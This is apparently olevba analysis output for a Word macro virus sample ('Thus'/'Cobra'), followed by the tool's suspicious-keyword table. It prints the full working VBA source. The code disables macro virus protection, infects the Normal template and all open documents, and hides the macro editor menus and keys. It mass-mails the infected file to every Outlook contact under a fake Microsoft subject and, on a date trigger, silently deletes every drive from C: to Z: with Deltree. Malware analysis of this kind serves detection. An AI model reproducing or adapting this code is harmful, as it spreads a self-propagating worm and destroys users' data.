olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-45787252d92b5e3dd37f4ba1bfac624ab28cf4af
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-45787252d92b5e3dd37f4ba1bfac624ab28cf4af - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Thus_001'" Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Thus_001'" Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    End If
    Next k
    frm_Msg.Show
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub
Private Sub Document_Save()
    Document_Open
End Sub






































Private Sub SpinButton1_Change()

End Sub






























-------------------------------------------------------------------------------
VBA MACRO Mon.bas 
in file: Virus.MSWord.Thus-based-45787252d92b5e3dd37f4ba1bfac624ab28cf4af - OLE stream: 'Macros/VBA/Mon'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 2.0I
'A New Electronically Poem

Sub AutoOpen()
Call CobA
End Sub
Sub AutoClose()
Call CobA
End Sub
Sub FileNew()
Dialogs(wdDialogFileNew).Show
Call CobA
End Sub
Sub CobA()
On Error Resume Next
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Dim U, D, B
If WeekDay(Date) = 1 Then Mod1 = "Sat"
If WeekDay(Date) = 2 Then Mod1 = "Sun"
If WeekDay(Date) = 3 Then Mod1 = "Mon"
If WeekDay(Date) = 4 Then Mod1 = "Tue"
If WeekDay(Date) = 5 Then Mod1 = "Wed"
If WeekDay(Date) = 6 Then Mod1 = "Thu"
If WeekDay(Date) = 7 Then Mod1 = "Fri"
For Each Doc In ActiveDocument.VBProject.VBComponents
If Doc.Name <> "Sat" And Doc.Name <> "Sun" _
And Doc.Name <> "Mon" And Doc.Name <> "Tue" And _
Doc.Name <> "Wed" And Doc.Name <> "Thu" _
And Doc.Name <> "Fri" And Doc.Name <> "ThisDocument" _
And Doc.Name <> "Reference to Normal" Then
Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Doc.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each Doc In NormalTemplate.VBProject.VBComponents
If Doc.Name <> "Sat" And Doc.Name <> "Sun" _
And Doc.Name <> "Mon" And Doc.Name <> "Tue" And _
Doc.Name <> "Wed" And Doc.Name <> "Thu" _
And Doc.Name <> "Fri" And Doc.Name <> "ThisDocument" Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Doc.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
ModFound = False
OldMod = "Module1"
For Each Doc In ActiveDocument.VBProject.VBComponents
If Doc.Name = "Sat" Or Doc.Name = "Sun" _
Or Doc.Name = "Mon" Or Doc.Name = "Tue" Or _
Doc.Name = "Wed" Or Doc.Name = "Thu" _
Or Doc.Name = "Fri" Then
ModFound = True
OldMod = Doc.Name
End If
Next
ModFoundN = False
OldModN = "Module1"
For Each Doc In NormalTemplate.VBProject.VBComponents
If Doc.Name = "Sat" Or Doc.Name = "Sun" _
Or Doc.Name = "Mon" Or Doc.Name = "Tue" Or _
Doc.Name = "Wed" Or Doc.Name = "Thu" _
Or Doc.Name = "Fri" Then
ModFoundN = True
OldModN = Doc.Name
End If
Next
If ModFound = True And OldMod <> "Module1" Then
Application.OrganizerRename Source:=ActiveDocument.FullName, _
Name:=OldMod, NewName:=Mod1, Object:=wdOrganizerObjectProjectItems
Else
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=ActiveDocument.FullName, Name:=OldModN, Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=NormalTemplate.FullName, _
Name:=OldModN, NewName:=Mod1, Object:=wdOrganizerObjectProjectItems
End If
If ModFoundN = True And OldModN <> "Module1" Then
Application.OrganizerRename Source:=NormalTemplate.FullName, _
Name:=OldModN, NewName:=Mod1, Object:=wdOrganizerObjectProjectItems
Else
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:=OldMod, Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=ActiveDocument.FullName, _
Name:=OldMod, NewName:=Mod1, Object:=wdOrganizerObjectProjectItems
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") <> "Cobra At " + Mod1 Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra At " + Mod1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "Dhaka,Bangladesh/3rd World"
Set U = CreateObject("Outlook.Application")
Set D = U.GetNameSpace("MAPI")
D.Logon "profile", "password"
For l = 1 To D.AddressLists.Count
Set AB = D.AddressLists(Y)
X = 1
Set B = U.CreateItem(0)
For I = 1 To AB.AddressEntries.Count
t = AB.AddressEntries(X)
B.Recipients.Add t
X = X + 1
Next I
B.Subject = "Important Message From Microsoft Via " & Application.UserName
B.Body = "Important Document About New Software:-"
B.Add ActiveDocument.FullName
B.Send
t = ""
Next l
D.Logoff
End If
If Month(Date) = 4 And WeekDay(Date) = 6 Then
For I = 67 To 67 + 23
Shell "Deltree /y " + Chr(I) + ":\", vbHide
Next
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |SpinButton1_Change  |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

